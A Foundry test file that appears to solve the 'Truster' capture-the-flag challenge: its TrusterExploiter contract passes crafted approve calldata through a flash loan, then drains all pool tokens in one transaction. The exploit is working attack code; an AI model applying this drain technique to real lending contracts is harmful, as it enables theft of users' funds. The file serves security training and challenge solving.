// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ERC20Mint} from "../../src/exchange/ERC20Mint.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploiter {
    constructor(TrusterLenderPool _pool, ERC20Mint _token, address _recovery) {
        // One transaction

        bytes memory data = abi.encodeWithSignature( // data encoded for functionCall()
            "approve(address,uint256)", // ends up as keccak256 hash
            address(this), // spend on behalf of pool
            _token.balanceOf(address(_pool))
        );

        _pool.flashLoan(
            0,
            address(this),
            address(_token),
            data // malicious data
        );

        _token.transferFrom(
            address(_pool), // from pool
            _recovery, // to recovery address
            _token.balanceOf(address(_pool))
        );
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18; // 1 million

    ERC20Mint public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new ERC20Mint("TestToken", "TT");

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.mint(deployer, TOKENS_IN_POOL);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        new TrusterExploiter(pool, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
